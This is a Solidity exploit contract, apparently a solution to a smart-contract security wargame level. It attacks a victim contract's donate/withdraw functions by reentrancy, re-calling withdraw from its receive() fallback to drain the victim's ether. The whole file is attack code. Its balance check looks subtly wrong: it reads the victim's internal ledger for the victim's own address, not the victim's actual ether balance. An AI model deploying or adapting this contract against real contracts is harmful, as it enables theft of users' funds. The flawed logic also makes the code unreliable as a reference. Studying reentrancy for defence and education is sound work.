// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IReentrance {
  function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint256 balance);

  function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
  IReentrance victimContract;
  uint256 initBalance;

  constructor(address _victimAddress) {
    victimContract = IReentrance(_victimAddress);
  }

  function attack() external payable {
    require(msg.value > 0.01 ether, '!enough ether');
    initBalance = msg.value;

    // Initial setup require a donation to kickstart the attack
    victimContract.donate{ value: initBalance }(address(this));
    victimContract.withdraw(initBalance);
  }

  function loopBack() private {
    // Compute remaining balance in the Victim contract
    uint256 remainingBalance = victimContract.balanceOf(
      address(victimContract)
    );

    if (remainingBalance > 0) {
      // Compute minimum amount between Attack contract and Victim contract
      uint256 minAmount = remainingBalance < initBalance
        ? remainingBalance
        : initBalance;
      victimContract.withdraw(minAmount);
    }
  }

  receive() external payable {
    loopBack();
  }
}
